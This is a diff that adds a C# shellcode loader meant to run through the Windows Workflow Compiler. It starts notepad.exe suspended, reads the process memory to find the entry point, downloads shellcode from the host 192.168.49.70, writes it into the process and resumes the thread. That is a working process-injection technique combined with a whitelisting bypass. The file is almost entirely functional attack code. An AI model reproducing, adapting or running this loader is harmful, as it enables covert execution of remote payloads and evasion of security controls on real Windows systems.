@@ -1,0 +1,157 @@
+// Simple shellcode loader that is to be used with the windows workflow compiler execution method
+
+using System;
+using System.Workflow.ComponentModel;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Threading;
+
+
+public class Run : Activity{
+
+        public struct STARTUP_INFO
+        {
+            public int cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public int dwX;
+            public int dwY;
+            public int dwXSize;
+            public int dwYSize;
+            public int dwXCountChars;
+            public int dwYCountChars;
+            public int dwFillAttribute;
+            public int dwFlags;
+            public short wShowWindow;
+            public short cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        public struct PROC_INFO
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        private struct PROC_BASIC_INFO
+        {
+            public IntPtr Reserved1;
+            public IntPtr PebAddress;
+            public IntPtr Reserved2;
+            public IntPtr Reserved3;
+            public IntPtr UniquePid;
+            public IntPtr MoreReserved;
+        }
+
+        private enum mem : uint
+        {
+            rwx = 0x40,        //PAGE_EXECUTE_READWRITE
+            rw = 0x04,         //PAGE_READ_WRITE
+            rx = 0x20,         //PAGE_READ_EXECUTE
+            cmt_rv = 0x3000,   //MEM_COMMIT_RESERVE
+            proc_all_access = 0x001F0FFF,
+            proc_suspend = 0x00000004
+        }
+
+        private static byte[] Fetch()
+        {
+            WebClient client = new WebClient();
+            client.BaseAddress = "http://192.168.49.70";
+            byte[] sc = client.DownloadData("sc.bin");
+            return sc;
+        }
+
+
+        [DllImport("kernel32", SetLastError = true)]
+        private static extern IntPtr LoadLibraryA(string lib_name);
+
+        [DllImport("kernel32", SetLastError = true)]
+        private static extern IntPtr GetProcAddress(IntPtr lib_handle, string func_name);
+
+        // Delegates
+        private delegate bool CPW(
+            [MarshalAs(UnmanagedType.LPWStr)] string app,
+            [MarshalAs(UnmanagedType.LPWStr)] string cmd,
+            IntPtr proc_attr,
+            IntPtr thread_attr,
+            bool inh_hand,
+            uint cflags,
+            IntPtr env,
+            [MarshalAs(UnmanagedType.LPWStr)] string cwd,
+            ref STARTUP_INFO str_info,
+            out PROC_INFO proc_info
+        );
+        private delegate bool RPM(IntPtr proc_hand, IntPtr base_addr, [Out] byte[] data_read, int read_size, out IntPtr bytes_read);
+        private delegate uint QueryProc(IntPtr proc_hand, int proc_info_class, ref PROC_BASIC_INFO proc_basic_info, uint proc_info_len, ref uint return_len);
+        private delegate bool WPM(IntPtr proc_hand, IntPtr addr, byte[] source, uint size, out uint written);
+        private delegate uint Res(IntPtr thread_hand);
+
+        // Functions
+        private static CPW Creator { get; set; }
+        private static RPM Reader { get; set; }
+        private static QueryProc query_proc { get; set; }
+        private static WPM Writer { get; set; }
+        private static Res Resume { get; set; }
+
+
+        public Run() {
+            IntPtr hModuleN = LoadLibraryA("ntdll.dll");
+            IntPtr hModule = LoadLibraryA("kernel32.dll");
+
+            query_proc = (QueryProc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModuleN, "ZwQueryInformationProcess"), typeof(QueryProc));
+            Reader = (RPM)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "ReadProcessMemory"), typeof(RPM));
+            Creator = (CPW)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "CreateProcessW"), typeof(CPW));
+            Writer = (WPM)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "WriteProcessMemory"), typeof(WPM));
+            Resume = (Res)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "ResumeThread"), typeof(Res));
+
+
+            // Create the process
+            STARTUP_INFO start_info = new STARTUP_INFO();
+            PROC_INFO proc_info = new PROC_INFO();
+            string proc = "C:\\Windows\\System32\\notepad.exe";
+
+            bool result = Creator(null, proc, IntPtr.Zero, IntPtr.Zero, false, (uint)mem.proc_suspend, 
+                IntPtr.Zero, null, ref start_info, out proc_info);
+
+            // Query the proc basic information
+            PROC_BASIC_INFO pbi = new PROC_BASIC_INFO();
+            uint return_len = 0;
+            uint res = query_proc(proc_info.hProcess, 0, ref pbi, (uint)(IntPtr.Size * 6), ref return_len);
+
+            IntPtr image_base_ptr = (IntPtr)((Int64)pbi.PebAddress + 0x10);
+
+            // Read from the proc memory
+            byte[] read_buffer = new byte[IntPtr.Size];
+            IntPtr read_len = IntPtr.Zero;
+
+            result = Reader(proc_info.hProcess, image_base_ptr, read_buffer, read_buffer.Length, out read_len);
+
+            IntPtr program_base = (IntPtr)(BitConverter.ToInt64(read_buffer, 0));
+
+            byte[] data = new byte[0x200];
+            Reader(proc_info.hProcess, program_base, data, data.Length, out read_len);
+
+            // Calculate the offsets to the entrypoint base address
+
+            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+            uint opt_hdrs = e_lfanew_offset + 0x28;
+            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opt_hdrs);
+            IntPtr entrypoint_addr = (IntPtr)((UInt64)program_base + entrypoint_rva);
+
+            byte[] sc = Fetch();
+
+            uint written = 0;
+            Writer(proc_info.hProcess, entrypoint_addr, sc, (uint)sc.Length, out written);
+
+            // Resuming the main thread of the process
+            Resume(proc_info.hThread);
+        }
+}
